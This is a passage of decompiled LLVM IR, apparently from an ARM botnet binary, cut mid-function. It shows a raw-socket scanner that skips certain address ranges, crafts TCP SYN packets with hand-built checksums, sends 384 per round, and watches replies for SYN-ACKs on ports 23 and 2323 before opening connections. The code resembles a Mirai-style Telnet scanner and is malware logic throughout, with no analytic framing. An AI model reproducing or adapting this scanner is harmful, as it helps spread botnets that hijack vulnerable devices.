  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ea0c

.thread32:                                        ; preds = %dec_label_pc_e9f8
  store i32 %.464, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ea04 = icmp eq i1 %v7_e9b8, false
  store i1 %v2_ea04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ea04, label %dec_label_pc_ea0c, label %dec_label_pc_e8e4

dec_label_pc_ea0c:                                ; preds = %.thread33, %.thread32
  %v2_ea0c = icmp ugt i32 %v1_e8e8, 149
  store i1 %v2_ea0c, i1* %cpsr_c.global-to-local, align 1
  %v7_ea0c = icmp eq i32 %v1_e8e8, 150
  store i1 %v7_ea0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea0c, label %bb390, label %dec_label_pc_ea18

bb390:                                            ; preds = %dec_label_pc_ea0c
  %v3_ea10 = icmp ugt i32 %v1_e8fc, 30
  store i1 %v3_ea10, i1* %cpsr_c.global-to-local, align 1
  %v8_ea10 = icmp eq i32 %v1_e8fc, 31
  store i1 %v8_ea10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea10, label %dec_label_pc_e8e4, label %dec_label_pc_ea18

dec_label_pc_ea18:                                ; preds = %dec_label_pc_ea0c, %bb390
  %v2_ea18 = icmp ugt i32 %v1_e8e8, 48
  store i1 %v2_ea18, i1* %cpsr_c.global-to-local, align 1
  %v7_ea18 = icmp eq i32 %v1_e8e8, 49
  store i1 %v7_ea18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea18, label %bb391, label %dec_label_pc_ea24

bb391:                                            ; preds = %dec_label_pc_ea18
  %v3_ea1c = icmp ugt i32 %v1_e8fc, 50
  store i1 %v3_ea1c, i1* %cpsr_c.global-to-local, align 1
  %v8_ea1c = icmp eq i32 %v1_e8fc, 51
  store i1 %v8_ea1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea1c, label %dec_label_pc_e8e4, label %dec_label_pc_ea24

dec_label_pc_ea24:                                ; preds = %dec_label_pc_ea18, %bb391
  %v2_ea24 = icmp ugt i32 %v1_e8e8, 177
  store i1 %v2_ea24, i1* %cpsr_c.global-to-local, align 1
  %v7_ea24 = icmp eq i32 %v1_e8e8, 178
  store i1 %v7_ea24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea24, label %bb392, label %dec_label_pc_ea30

bb392:                                            ; preds = %dec_label_pc_ea24
  %v3_ea28 = icmp ugt i32 %v1_e8fc, 61
  store i1 %v3_ea28, i1* %cpsr_c.global-to-local, align 1
  %v8_ea28 = icmp eq i32 %v1_e8fc, 62
  store i1 %v8_ea28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea28, label %dec_label_pc_e8e4, label %dec_label_pc_ea30

dec_label_pc_ea30:                                ; preds = %dec_label_pc_ea24, %bb392
  %v2_ea30 = icmp ugt i32 %v1_e8e8, 159
  store i1 %v2_ea30, i1* %cpsr_c.global-to-local, align 1
  %v7_ea30 = icmp eq i32 %v1_e8e8, 160
  store i1 %v7_ea30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea30, label %bb393, label %dec_label_pc_ea3c

bb393:                                            ; preds = %dec_label_pc_ea30
  %v3_ea34 = icmp ugt i32 %v1_e8fc, 12
  store i1 %v3_ea34, i1* %cpsr_c.global-to-local, align 1
  %v8_ea34 = icmp eq i32 %v1_e8fc, 13
  store i1 %v8_ea34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea34, label %dec_label_pc_e8e4, label %dec_label_pc_ea3c

dec_label_pc_ea3c:                                ; preds = %dec_label_pc_ea30, %bb393
  %v1_ea3c = add nsw i32 %v1_e8e8, -6
  store i32 %v1_ea3c, i32* %r3.global-to-local, align 4
  %v2_ea40 = icmp ugt i32 %v1_e8e8, 10
  store i1 %v2_ea40, i1* %cpsr_c.global-to-local, align 1
  %v7_ea40 = icmp eq i32 %v1_e8e8, 11
  store i1 %v7_ea40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea40, label %dec_label_pc_e8e4, label %bb394

bb394:                                            ; preds = %dec_label_pc_ea3c
  %v3_ea44 = icmp ne i32 %v1_ea3c, 0
  store i1 %v3_ea44, i1* %cpsr_c.global-to-local, align 1
  %v8_ea44 = icmp eq i32 %v1_ea3c, 1
  store i1 %v8_ea44, i1* %cpsr_z.global-to-local, align 1
  %v2_ea48 = xor i1 %v3_ea44, true
  %v3_ea48 = or i1 %v8_ea44, %v2_ea48
  br i1 %v3_ea48, label %dec_label_pc_e8e4, label %dec_label_pc_ea4c

dec_label_pc_ea4c:                                ; preds = %bb394
  %v2_ea4c = icmp ugt i32 %v1_e8e8, 21
  store i1 %v2_ea4c, i1* %cpsr_c.global-to-local, align 1
  %v7_ea4c = icmp eq i32 %v1_e8e8, 22
  store i1 %v7_ea4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea4c, label %dec_label_pc_e8e4, label %bb395

bb395:                                            ; preds = %dec_label_pc_ea4c
  %v3_ea50 = icmp ugt i32 %v1_e8e8, 20
  store i1 %v3_ea50, i1* %cpsr_c.global-to-local, align 1
  %v8_ea50 = icmp eq i32 %v1_e8e8, 21
  store i1 %v8_ea50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea50, label %dec_label_pc_e8e4, label %dec_label_pc_ea58

dec_label_pc_ea58:                                ; preds = %bb395
  %v2_ea58 = icmp ugt i32 %v1_e8e8, 27
  store i1 %v2_ea58, i1* %cpsr_c.global-to-local, align 1
  %v7_ea58 = icmp eq i32 %v1_e8e8, 28
  store i1 %v7_ea58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea58, label %dec_label_pc_e8e4, label %bb396

bb396:                                            ; preds = %dec_label_pc_ea58
  %v3_ea5c = icmp ugt i32 %v1_e8e8, 25
  store i1 %v3_ea5c, i1* %cpsr_c.global-to-local, align 1
  %v8_ea5c = icmp eq i32 %v1_e8e8, 26
  store i1 %v8_ea5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea5c, label %dec_label_pc_e8e4, label %dec_label_pc_ea64

dec_label_pc_ea64:                                ; preds = %bb396
  %v2_ea64 = icmp ugt i32 %v1_e8e8, 29
  store i1 %v2_ea64, i1* %cpsr_c.global-to-local, align 1
  %v7_ea64 = icmp eq i32 %v1_e8e8, 30
  store i1 %v7_ea64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea64, label %dec_label_pc_e8e4, label %bb397

bb397:                                            ; preds = %dec_label_pc_ea64
  %v3_ea68 = icmp ugt i32 %v1_e8e8, 28
  store i1 %v3_ea68, i1* %cpsr_c.global-to-local, align 1
  %v8_ea68 = icmp eq i32 %v1_e8e8, 29
  store i1 %v8_ea68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea68, label %dec_label_pc_e8e4, label %dec_label_pc_ea70

dec_label_pc_ea70:                                ; preds = %bb397
  %v2_ea70 = icmp ugt i32 %v1_e8e8, 54
  store i1 %v2_ea70, i1* %cpsr_c.global-to-local, align 1
  %v7_ea70 = icmp eq i32 %v1_e8e8, 55
  store i1 %v7_ea70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea70, label %dec_label_pc_e8e4, label %bb398

bb398:                                            ; preds = %dec_label_pc_ea70
  %v3_ea74 = icmp ugt i32 %v1_e8e8, 32
  store i1 %v3_ea74, i1* %cpsr_c.global-to-local, align 1
  %v8_ea74 = icmp eq i32 %v1_e8e8, 33
  store i1 %v8_ea74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea74, label %dec_label_pc_e8e4, label %dec_label_pc_ea7c

dec_label_pc_ea7c:                                ; preds = %bb398
  %v2_ea7c = icmp ugt i32 %v1_e8e8, 214
  store i1 %v2_ea7c, i1* %cpsr_c.global-to-local, align 1
  %v7_ea7c = icmp eq i32 %v1_e8e8, 215
  store i1 %v7_ea7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea7c, label %.thread48, label %bb399

bb399:                                            ; preds = %dec_label_pc_ea7c
  %v3_ea80 = icmp ugt i32 %v1_e8e8, 213
  store i1 %v3_ea80, i1* %cpsr_c.global-to-local, align 1
  %v8_ea80 = icmp eq i32 %v1_e8e8, 214
  store i1 %v8_ea80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea80, label %bb400, label %dec_label_pc_ea90

.thread48:                                        ; preds = %dec_label_pc_ea7c
  br label %dec_label_pc_e8e4

bb400:                                            ; preds = %bb399
  br label %dec_label_pc_e8e4

dec_label_pc_ea90:                                ; preds = %bb399
  %v5_ea9c = call i32 @llvm.bswap.i32(i32 %v0_e8e4)
  store i32 %v5_ea9c, i32* %r3.global-to-local, align 4
  %tmp401 = and i32 %v0_e8e4, 65280
  %tmp402 = call i32 @llvm.bswap.i32(i32 %tmp401)
  %v3_eaa4 = udiv i32 %v5_ea9c, 16777216
  %tmp403 = and i32 %v0_e8e4, 16711680
  %tmp404 = call i32 @llvm.bswap.i32(i32 %tmp403)
  %v4_eaac = udiv i32 %tmp402, 256
  %v4_eab0 = mul nuw nsw i32 %tmp404, 256
  store i32 ptrtoint (i8** @global_var_21c24.155 to i32), i32* @r0, align 4
  %tmp405 = and i32 %v0_e8e4, 65536
  %v3_eab8 = icmp ne i32 %tmp405, 0
  store i1 %v3_eab8, i1* %cpsr_c.global-to-local, align 1
  %v4_eab8 = mul i32 %v5_ea9c, 16777216
  %v5_eaac = or i32 %v4_eab8, %v3_eaa4
  %v5_eab0 = or i32 %v5_eaac, %v4_eaac
  %v5_eab8 = or i32 %v5_eab0, %v4_eab0
  store i32 %v5_eab8, i32* %r2.global-to-local, align 4
  store i16 0, i16* bitcast (i32* @global_var_21c2e.197 to i16*), align 4
  store i32 20, i32* %r1.global-to-local, align 4
  store i32 %v5_eab8, i32* @global_var_21c34.198, align 4
  %v3_eac8 = call i32 @checksum_generic(i32 ptrtoint (i8** @global_var_21c24.155 to i32), i32 20)
  %v4_eac8 = trunc i32 %v3_eac8 to i16
  store i32 %v3_eac8, i32* %r0.global-to-local, align 4
  %v3_eacc = load i32, i32* %stack_var_-52, align 4
  %v5_eadc = sdiv i32 %v3_eacc, 10
  %v3_eae0 = mul i32 %v5_eadc, 8
  store i32 %v3_eae0, i32* %r2.global-to-local, align 4
  %v2_eae8 = mul i32 %v5_eadc, 10
  store i32 %v2_eae8, i32* %r3.global-to-local, align 4
  %v3_eaec = icmp uge i32 %v3_eacc, %v2_eae8
  store i1 %v3_eaec, i1* %cpsr_c.global-to-local, align 1
  %v9_eaec = icmp eq i32 %v3_eacc, %v2_eae8
  store i1 %v9_eaec, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i8** @global_var_21c24.155 to i32), i32* %r1.global-to-local, align 4
  br i1 %v9_eaec, label %bb406, label %.thread60

.thread60:                                        ; preds = %dec_label_pc_ea90
  store i32 ptrtoint (i16* @global_var_21c38.158 to i32), i32* %r3.global-to-local, align 4
  store i16 %v4_eac8, i16* bitcast (i32* @global_var_21c2e.197 to i16*), align 4
  store i32 ptrtoint (i8** @global_var_21c24.155 to i32), i32* %r0.global-to-local, align 4
  store i16 5888, i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_21c38.158 to i32), i32 2) to i16*), align 2
  %v4_eb0c = load i32, i32* @global_var_21c34.198, align 4
  store i32 %v4_eb0c, i32* @global_var_21c3c.200, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %bb407

bb406:                                            ; preds = %dec_label_pc_ea90
  store i16 %v4_eac8, i16* bitcast (i32* @global_var_21c2e.197 to i16*), align 4
  store i32 ptrtoint (i8** @global_var_21c24.155 to i32), i32* %r0.global-to-local, align 4
  %v4_eb0c54 = load i32, i32* @global_var_21c34.198, align 4
  store i32 ptrtoint (i16* @global_var_21c38.158 to i32), i32* %r2.global-to-local, align 4
  store i32 4873, i32* %r3.global-to-local, align 4
  store i32 %v4_eb0c54, i32* @global_var_21c3c.200, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i16 4873, i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_21c38.158 to i32), i32 2) to i16*), align 2
  br label %bb407

bb407:                                            ; preds = %.thread60, %bb406
  store i16 0, i16* bitcast (i32* @global_var_21c48.201 to i16*), align 4
  store i32 ptrtoint (i16* @global_var_21c38.158 to i32), i32* @r1, align 4
  store i32 5120, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v6_eb38 = call i32 @checksum_tcpudp(i32 ptrtoint (i8** @global_var_21c24.155 to i32), i32 sext (i16 ptrtoint (i16* @global_var_21c38.158 to i16) to i32), i32 5120, i32 20)
  %v7_eb38 = trunc i32 %v6_eb38 to i16
  store i32 ptrtoint (i8** @global_var_21c24.155 to i32), i32* %r1.global-to-local, align 4
  %v2_eb44 = load i32, i32* @global_var_2473c.153, align 4
  store i16 %v7_eb38, i16* bitcast (i32* @global_var_21c48.201 to i16*), align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v3_eb70 = load i16, i16* @global_var_21c3a.163, align 2
  %v4_eb70 = zext i16 %v3_eb70 to i32
  store i32 %v4_eb70, i32* @lr, align 4
  store i32 %v2_f9e4, i32* %ip.global-to-local, align 4
  store i32 %v2_eb44, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v7_eb8c = call i32 @__libc_sendto(i32 %v2_eb44, i32 ptrtoint (i8** @global_var_21c24.155 to i32), i32 40, i32 16384, i32 %v2_e8b4, i32 16)
  store i32 %v7_eb8c, i32* %r0.global-to-local, align 4
  %v3_eb90 = load i32, i32* %stack_var_-52, align 4
  %v1_eb94 = add i32 %v3_eb90, 1
  store i32 %v1_eb94, i32* %r3.global-to-local, align 4
  %v3_eb98 = icmp ugt i32 %v1_eb94, 383
  store i1 %v3_eb98, i1* %cpsr_c.global-to-local, align 1
  %v8_eb98 = icmp eq i32 %v1_eb94, 384
  store i1 %v8_eb98, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_eb94, i32* %stack_var_-52, align 4
  %v5_eba0 = icmp slt i32 %v1_eb94, 384
  br i1 %v5_eba0, label %dec_label_pc_e8b8, label %dec_label_pc_eba4

dec_label_pc_eba4:                                ; preds = %bb407
  %v0_eba4 = load i32, i32* @r4, align 4
  br label %dec_label_pc_eba8

dec_label_pc_eba8:                                ; preds = %dec_label_pc_e894, %dec_label_pc_eba4
  %stack_var_-1876.1 = phi i32 [ %stack_var_-1876.0, %dec_label_pc_e894 ], [ %v0_eba4, %dec_label_pc_eba4 ]
  %v0_eba8 = call i32 @__GI___errno_location()
  store i32 %v0_eba8, i32* @fp, align 4
  store i32 %v2_e88c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_ebb8, i32* @r4, align 4
  br label %dec_label_pc_ebbc

dec_label_pc_ebbc:                                ; preds = %dec_label_pc_ec7c, %dec_label_pc_ec74, %dec_label_pc_ec6c, %dec_label_pc_ec48, %dec_label_pc_ec38, %dec_label_pc_ec1c, %dec_label_pc_ec04, %dec_label_pc_ec64, %dec_label_pc_ec58, %dec_label_pc_ebfc, %dec_label_pc_ed34, %dec_label_pc_eba8
  %v1_ebc0 = phi i32 [ %v0_eba8, %dec_label_pc_eba8 ], [ %v1_ebc0.pre.pre, %dec_label_pc_ed34 ], [ %v0_ebf0, %dec_label_pc_ebfc ], [ %v0_ebf0, %dec_label_pc_ec58 ], [ %v0_ebf0, %dec_label_pc_ec64 ], [ %v0_ebf0, %dec_label_pc_ec04 ], [ %v0_ebf0, %dec_label_pc_ec1c ], [ %v0_ebf0, %dec_label_pc_ec38 ], [ %v0_ebf0, %dec_label_pc_ec48 ], [ %v0_ebf0, %dec_label_pc_ec6c ], [ %v0_ebf0, %dec_label_pc_ec74 ], [ %v0_ebf0, %dec_label_pc_ec7c ]
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_ebc0 = inttoptr i32 %v1_ebc0 to i32*
  store i32 0, i32* %v2_ebc0, align 4
  %v2_ebcc = load i32, i32* @global_var_2473c.153, align 4
  store i32 %v2_ebcc, i32* %r0.global-to-local, align 4
  store i32 1514, i32* %r2.global-to-local, align 4
  store i32 %v2_e88c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ebdc = load i32, i32* %ip.global-to-local, align 4
  %v6_ebe4 = call i32 @__libc_recvfrom(i32 %v2_ebcc, i32 %v2_e88c, i32 1514, i32 16384, i32 %v0_ebdc, i32 %v0_ebdc)
  store i32 %v6_ebe4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ebe8 = icmp eq i32 %v6_ebe4, 0
  store i1 %v2_ebe8, i1* %cpsr_z.global-to-local, align 1
  %tmp408 = icmp slt i32 %v6_ebe4, 1
  br i1 %tmp408, label %dec_label_pc_ed44, label %dec_label_pc_ebf0

dec_label_pc_ebf0:                                ; preds = %dec_label_pc_ebbc
  %v0_ebf0 = load i32, i32* @fp, align 4
  %v1_ebf0 = inttoptr i32 %v0_ebf0 to i32*
  %v2_ebf0 = load i32, i32* %v1_ebf0, align 4
  store i32 %v2_ebf0, i32* %r3.global-to-local, align 4
  %v2_ebf4 = icmp ugt i32 %v2_ebf0, 10
  store i1 %v2_ebf4, i1* %cpsr_c.global-to-local, align 1
  %v7_ebf4 = icmp eq i32 %v2_ebf0, 11
  store i1 %v7_ebf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ebf4, label %dec_label_pc_ed44, label %dec_label_pc_ebfc

dec_label_pc_ebfc:                                ; preds = %dec_label_pc_ebf0
  %v2_ebfc = icmp ugt i32 %v6_ebe4, 38
  store i1 %v2_ebfc, i1* %cpsr_c.global-to-local, align 1
  %v7_ebfc = icmp eq i32 %v6_ebe4, 39
  store i1 %v7_ebfc, i1* %cpsr_z.global-to-local, align 1
  %v2_ec00 = xor i1 %v2_ebfc, true
  %v3_ec00 = or i1 %v7_ebfc, %v2_ec00
  br i1 %v3_ec00, label %dec_label_pc_ebbc, label %dec_label_pc_ec04

dec_label_pc_ec04:                                ; preds = %dec_label_pc_ebfc
  store i32 %v2_e88c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2471c.58 to i32), i32* %ip.global-to-local, align 4
  %v3_ec0c = load i32, i32* %v2_ec0c, align 4
  store i32 %v3_ec0c, i32* %r2.global-to-local, align 4
  %v2_ec10 = load i32, i32* @global_var_2471c.58, align 4
  store i32 %v2_ec10, i32* %r3.global-to-local, align 4
  %v3_ec14 = icmp uge i32 %v3_ec0c, %v2_ec10
  store i1 %v3_ec14, i1* %cpsr_c.global-to-local, align 1
  %v9_ec14 = icmp eq i32 %v3_ec0c, %v2_ec10
  store i1 %v9_ec14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ec14, label %dec_label_pc_ec1c, label %dec_label_pc_ebbc

dec_label_pc_ec1c:                                ; preds = %dec_label_pc_ec04
  store i32 %v2_e88c, i32* @lr, align 4
  %v3_ec20 = load i8, i8* %v2_ec20, align 1
  %v4_ec20 = zext i8 %v3_ec20 to i32
  store i32 %v4_ec20, i32* %r3.global-to-local, align 4
  %v2_ec24 = icmp ugt i8 %v3_ec20, 5
  store i1 %v2_ec24, i1* %cpsr_c.global-to-local, align 1
  %v7_ec24 = icmp eq i8 %v3_ec20, 6
  store i1 %v7_ec24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec24, label %dec_label_pc_ec2c, label %dec_label_pc_ebbc

dec_label_pc_ec2c:                                ; preds = %dec_label_pc_ec1c
  %v0_ec2c = load i32, i32* @r4, align 4
  %v1_ec2c = inttoptr i32 %v0_ec2c to i16*
  %v2_ec2c = load i16, i16* %v1_ec2c, align 2
  %v3_ec2c = zext i16 %v2_ec2c to i32
  store i32 %v3_ec2c, i32* %ip.global-to-local, align 4
  %v2_ec30 = icmp ugt i16 %v2_ec2c, 5887
  store i1 %v2_ec30, i1* %cpsr_c.global-to-local, align 1
  %v7_ec30 = icmp eq i16 %v2_ec2c, 5888
  store i1 %v7_ec30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec30, label %dec_label_pc_ec48, label %dec_label_pc_ec38

dec_label_pc_ec38:                                ; preds = %dec_label_pc_ec2c
  store i32 4873, i32* %r3.global-to-local, align 4
  %v3_ec40 = icmp ugt i16 %v2_ec2c, 4872
  store i1 %v3_ec40, i1* %cpsr_c.global-to-local, align 1
  %v9_ec40 = icmp eq i16 %v2_ec2c, 4873
  store i1 %v9_ec40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ec40, label %dec_label_pc_ec48, label %dec_label_pc_ebbc

dec_label_pc_ec48:                                ; preds = %dec_label_pc_ec38, %dec_label_pc_ec2c
  %v1_ec48 = add i32 %v0_ec2c, 2
  %v2_ec48 = inttoptr i32 %v1_ec48 to i16*
  %v3_ec48 = load i16, i16* %v2_ec48, align 2
  %v4_ec48 = zext i16 %v3_ec48 to i32
  store i32 %v4_ec48, i32* %r3.global-to-local, align 4
  store i32 %v4_e75c, i32* %r0.global-to-local, align 4
  %v3_ec50 = icmp uge i32 %v4_ec48, %v4_e75c
  store i1 %v3_ec50, i1* %cpsr_c.global-to-local, align 1
  %v9_ec50 = icmp eq i32 %v4_ec48, %v4_e75c
  store i1 %v9_ec50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ec50, label %dec_label_pc_ec58, label %dec_label_pc_ebbc

dec_label_pc_ec58:                                ; preds = %dec_label_pc_ec48
  %v1_ec58 = add i32 %v0_ec2c, 13
  %v2_ec58 = inttoptr i32 %v1_ec58 to i8*
  %v3_ec58 = load i8, i8* %v2_ec58, align 1
  %v4_ec58 = zext i8 %v3_ec58 to i32
  store i32 %v4_ec58, i32* %r3.global-to-local, align 4
  %v1_ec5c = and i32 %v4_ec58, 2
  %v2_ec5c = icmp eq i32 %v1_ec5c, 0
  store i1 %v2_ec5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec5c, label %dec_label_pc_ebbc, label %dec_label_pc_ec64

dec_label_pc_ec64:                                ; preds = %dec_label_pc_ec58
  %v1_ec64 = and i32 %v4_ec58, 16
  %v2_ec64 = icmp eq i32 %v1_ec64, 0
  store i1 %v2_ec64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec64, label %dec_label_pc_ebbc, label %dec_label_pc_ec6c

dec_label_pc_ec6c:                                ; preds = %dec_label_pc_ec64
  %v1_ec6c = and i32 %v4_ec58, 4
  %v2_ec6c = icmp eq i32 %v1_ec6c, 0
  store i1 %v2_ec6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec6c, label %dec_label_pc_ec74, label %dec_label_pc_ebbc

dec_label_pc_ec74:                                ; preds = %dec_label_pc_ec6c
  %tmp = urem i8 %v3_ec58, 2
  %v2_ec74 = icmp eq i8 %tmp, 0
  store i1 %v2_ec74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec74, label %dec_label_pc_ec7c, label %dec_label_pc_ebbc

dec_label_pc_ec7c:                                ; preds = %dec_label_pc_ec74
  %v1_ec7c = add i32 %v0_ec2c, 8
  %v2_ec7c = inttoptr i32 %v1_ec7c to i32*
  %v3_ec7c = load i32, i32* %v2_ec7c, align 4
  %v5_ec94 = call i32 @llvm.bswap.i32(i32 %v3_ec7c)
  %v1_ec98 = add i32 %v5_ec94, -1
  store i32 %v1_ec98, i32* %r2.global-to-local, align 4
  %v1_ec9c = and i32 %v1_ec98, 16711680
  store i32 %v1_ec9c, i32* %r0.global-to-local, align 4
  %v3_eca0 = udiv i32 %v1_ec98, 16777216
  %v4_eca8 = udiv i32 %v1_ec9c, 256
  %v5_eca8 = or i32 %v4_eca8, %v3_eca0
  %v1_eca4 = mul i32 %v1_ec98, 256
  %v4_ecac = and i32 %v1_eca4, 16711680
  %v5_ecac = or i32 %v5_eca8, %v4_ecac
  store i32 %v5_ecac, i32* %r3.global-to-local, align 4
  store i32 %v2_e88c, i32* %r1.global-to-local, align 4
  %v3_ecb4 = load i32, i32* %v2_ecb4, align 4
  store i32 %v3_ecb4, i32* @lr, align 4
  %v5_ecb8 = call i32 @llvm.bswap.i32(i32 %v1_ec98)
  store i32 %v5_ecb8, i32* %r3.global-to-local, align 4
  %v3_ecbc = icmp uge i32 %v5_ecb8, %v3_ecb4
  store i1 %v3_ecbc, i1* %cpsr_c.global-to-local, align 1
  %v9_ecbc = icmp eq i32 %v5_ecb8, %v3_ecb4
  store i1 %v9_ecbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ecbc, label %dec_label_pc_ecc4, label %dec_label_pc_ebbc

dec_label_pc_ecc4:                                ; preds = %dec_label_pc_ec7c
  %v0_ecc4 = load i32, i32* @r5, align 4
  %v2_ecc4 = icmp ugt i32 %v0_ecc4, 254
  store i1 %v2_ecc4, i1* %cpsr_c.global-to-local, align 1
  %v7_ecc4 = icmp eq i32 %v0_ecc4, 255
  store i1 %v7_ecc4, i1* %cpsr_z.global-to-local, align 1
  %v8_ecc8 = icmp sgt i32 %v0_ecc4, 255
  br i1 %v8_ecc8, label %dec_label_pc_ed44, label %dec_label_pc_eccc

dec_label_pc_eccc:                                ; preds = %dec_label_pc_ecc4
  %v2_ecd4 = load i32, i32* @global_var_24738.151, align 4
  store i32 %v2_ecd4, i32* %r1.global-to-local, align 4
  %v3_ecd8 = mul i32 %v0_ecc4, 256
  store i32 %v3_ecd8, i32* %r2.global-to-local, align 4
  %v2_ecdc = mul i32 %v0_ecc4, 288
  store i32 %v2_ecdc, i32* %r3.global-to-local, align 4
  %v2_ece0 = add i32 %v2_ecd4, %v2_ecdc
  store i32 %v2_ece0, i32* @r0, align 4
  %v1_ece4 = add i32 %v2_ece0, 12
  %v2_ece4 = inttoptr i32 %v1_ece4 to i32*
  %v3_ece4 = load i32, i32* %v2_ece4, align 4
  store i32 %v3_ece4, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ece8 = icmp eq i32 %v3_ece4, 0
  store i1 %v2_ece8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ece8, label %dec_label_pc_ed2c, label %dec_label_pc_ed08.preheader

dec_label_pc_ed08.preheader:                      ; preds = %dec_label_pc_eccc
  %v2_ecec = add i32 %v0_ecc4, 1
  %v2_ecf4 = and i32 %v2_ecec, 134217728
  %v3_ecf4 = icmp ne i32 %v2_ecf4, 0
  store i1 %v3_ecf4, i1* %cpsr_c.global-to-local, align 1
  %v3_ecf8 = mul i32 %v2_ecec, 288
  %v3_ecfc = add i32 %v2_ecd4, %v3_ecf8
  store i32 %v3_ecfc, i32* %r3.global-to-local, align 4
  store i32 %v0_ecc4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ed08

dec_label_pc_ed08:                                ; preds = %dec_label_pc_ed08.preheader, %dec_label_pc_ed14
  %v0_ed14 = phi i32 [ %v3_ecfc, %dec_label_pc_ed08.preheader ], [ %v1_ed20, %dec_label_pc_ed14 ]
  %v0_ed08 = phi i32 [ %v0_ecc4, %dec_label_pc_ed08.preheader ], [ %v1_ed08, %dec_label_pc_ed14 ]
  %v1_ed08 = add i32 %v0_ed08, 1
  store i32 %v1_ed08, i32* %r2.global-to-local, align 4
  %v7_ed0c = icmp eq i32 %v1_ed08, 256
  br i1 %v7_ed0c, label %dec_label_pc_ed44.loopexit, label %dec_label_pc_ed14

dec_label_pc_ed14:                                ; preds = %dec_label_pc_ed08
  store i32 %v0_ed14, i32* @r0, align 4
  %v1_ed18 = add i32 %v0_ed14, 12
  %v2_ed18 = inttoptr i32 %v1_ed18 to i32*
  %v3_ed18 = load i32, i32* %v2_ed18, align 4
  %v2_ed1c = icmp eq i32 %v3_ed18, 0
  %v1_ed20 = add i32 %v0_ed14, 288
  store i32 %v1_ed20, i32* %r3.global-to-local, align 4
  br i1 %v2_ed1c, label %dec_label_pc_ed28, label %dec_label_pc_ed08

dec_label_pc_ed28:                                ; preds = %dec_label_pc_ed14
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ed08, i32* @r5, align 4
  br label %dec_label_pc_ed2c

dec_label_pc_ed2c:                                ; preds = %dec_label_pc_eccc, %dec_label_pc_ed28
  %v1_ed34 = phi i32 [ %v2_ece0, %dec_label_pc_eccc ], [ %v0_ed14, %dec_label_pc_ed28 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ed2c = icmp eq i32 %v1_ed34, 0
  store i1 %v2_ed2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ed2c, label %dec_label_pc_ed44, label %dec_label_pc_ed34

dec_label_pc_ed34:                                ; preds = %dec_label_pc_ed2c
  %v2_ed34 = add i32 %v1_ed34, 16
  %v3_ed34 = inttoptr i32 %v2_ed34 to i32*
  store i32 %v3_ecb4, i32* %v3_ed34, align 4
  %v0_ed38 = load i32, i32* %ip.global-to-local, align 4
  %v1_ed38 = trunc i32 %v0_ed38 to i16
  %v2_ed38 = load i32, i32* @r0, align 4
  %v3_ed38 = add i32 %v2_ed38, 20
  %v4_ed38 = inttoptr i32 %v3_ed38 to i16*
  store i16 %v1_ed38, i16* %v4_ed38, align 2
  %v0_ed3c = call i32 @setup_connection()
  store i32 %v0_ed3c, i32* %r0.global-to-local, align 4
  %v1_ebc0.pre.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_ebbc

dec_label_pc_ed44.loopexit:                       ; preds = %dec_label_pc_ed08
  store i1 true, i1* %cpsr_c.global-to-local, align 1
